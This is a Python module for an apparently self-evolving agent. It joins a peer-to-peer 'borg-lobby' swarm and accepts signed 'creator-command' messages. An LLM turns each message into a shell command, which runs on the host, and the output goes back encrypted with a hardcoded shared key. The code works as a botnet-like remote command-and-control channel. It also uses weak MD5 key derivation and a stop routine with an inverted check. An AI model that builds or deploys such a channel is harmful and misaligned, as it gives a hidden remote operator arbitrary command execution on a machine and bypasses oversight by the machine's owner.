import subprocess
import time
import json
import logging
import os
import base64
import hashlib

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from threading import Thread

from rich.console import Console

SHARED_SECRET = 'a-very-secret-key-that-should-be-exchanged-securely'

def evp_bytes_to_key(password, salt, key_len, iv_len):
    dt_i = b''
    key = b''
    iv = b''
    while len(key) < key_len or len(iv) < iv_len:
        dt_i = hashlib.md5(dt_i + password.encode('utf-8') + salt).digest()
        if len(key) < key_len:
            key += dt_i[:min(len(dt_i), key_len - len(key))]
        if len(iv) < iv_len and len(key) >= key_len:
            iv += dt_i[:min(len(dt_i), iv_len - len(iv))]
    return key, iv

def encrypt_message(text):
    try:
        salt = os.urandom(8)
        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)
        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(text.encode()) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(b"Salted__" + salt + ct).decode('utf-8')
    except Exception as e:
        return None

def decrypt_message(encrypted_message_b64):
    try:
        data = base64.b64decode(encrypted_message_b64)
        salt = data[8:16]
        ciphertext = data[16:]
        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        unpadded_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return unpadded_data.decode('utf-8')
    except Exception as e:
        return None

class NetworkManager(Thread):
    def __init__(self, console=None, creator_public_key=None):
        super().__init__()
        self.daemon = True
        self.console = console if console else Console()
        self.creator_public_key = creator_public_key
        self.bridge_process = None
        self.peer_id = None
        self.online = False
        self.connections = {}
        self.creator_id = None

    def run(self):
        try:
            self.bridge_process = subprocess.Popen(['node', 'peer-bridge.js'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1, encoding='utf-8')
            Thread(target=self._read_stdout, daemon=True).start()
        except Exception as e:
            self.console.print(f"[bold red]Critical error starting Node.js bridge: {e}[/bold red]")

    def _read_stdout(self):
        for line in iter(self.bridge_process.stdout.readline, ''):
            if not line.strip(): continue
            try:
                message = json.loads(line)
                msg_type = message.get('type')
                if msg_type == 'status': self._handle_status(message)
                elif msg_type == 'p2p-data': self._handle_p2p_data(message)
                elif msg_type == 'connection': self.connections[message.get('peer')] = 'connected'
                elif msg_type == 'disconnection':
                    if message.get('peer') in self.connections: del self.connections[message.get('peer')]
            except Exception as e:
                logging.error(f"Error processing message from bridge: {e}\nMessage: {line.strip()}")

    def _handle_status(self, message):
        if message.get('status') == 'online':
            self.peer_id = message['peerId']
            self.online = True
            self.console.print(f"[green]Network bridge online. Peer ID: {self.peer_id}[/green]")
            self.connect_to_peer('borg-lobby')
        elif message.get('status') == 'error':
            self.online = False

    def _handle_p2p_data(self, message):
        peer_id = message.get('peer')
        payload = message.get('payload', {})
        if peer_id == 'borg-lobby':
            if payload.get('type') == 'welcome':
                for p_id in payload.get('peers', []): self.connect_to_peer(p_id)
            elif payload.get('type') == 'peer-connect':
                self.connect_to_peer(payload.get('peerId'))
            return
        try:
            decrypted_str = decrypt_message(payload.get('payload'))
            if not decrypted_str: return
            inner_payload = json.loads(decrypted_str)
            if inner_payload.get('type') == 'creator-command':
                self._handle_creator_command(peer_id, inner_payload.get('payload', {}))
            elif inner_payload.get('type') == 'creator-announcement':
                self.creator_id = peer_id
        except Exception as e:
            logging.error(f"Error processing encrypted P2P data: {e}")

    def ask_question(self, question):
        if self.creator_id:
            message = {'type': 'question', 'id': f'q-{time.time()}', 'question': question}
            self.send_message(self.creator_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(message))})
        else:
            self.console.print("[yellow]Cannot ask question: Creator not found.[/yellow]")

    def _handle_creator_command(self, peer_id, payload):
        command = payload.get('command')
        try:
            public_key = serialization.load_pem_public_key(self.creator_public_key.encode('utf-8'))
            public_key.verify(bytes.fromhex(payload.get('signature')), command.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
            from evolve import run_llm, execute_shell_command
            executable_command = run_llm(f"Translate this to a command: '{command}'")
            if executable_command:
                stdout, stderr, code = execute_shell_command(executable_command, {})
                output = f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
                response = {'type': 'action-response', 'output': output}
                self.send_message(peer_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(response))})
        except Exception as e:
            logging.error(f"Error processing creator command: {e}")

    def send_message(self, peer_id, payload):
        self._send_command_to_bridge({'type': 'p2p-send', 'peer': peer_id, 'payload': payload})

    def connect_to_peer(self, peer_id):
        self._send_command_to_bridge({'type': 'connect-to-peer', 'peerId': peer_id})

    def _send_command_to_bridge(self, command):
        if not self.bridge_process or self.bridge_process.poll() is not None: return
        try:
            self.bridge_process.stdin.write(json.dumps(command) + '\n')
            self.bridge_process.stdin.flush()
        except Exception as e:
            logging.error(f"Failed to write to node bridge stdin: {e}")

    def stop(self):
        if self.bridge_process and self.bridge_process.poll() is not None:
            self.bridge_process.terminate()
            try: self.bridge_process.wait(timeout=5)
            except subprocess.TimeoutExpired: self.bridge_process.kill()
        self.online = False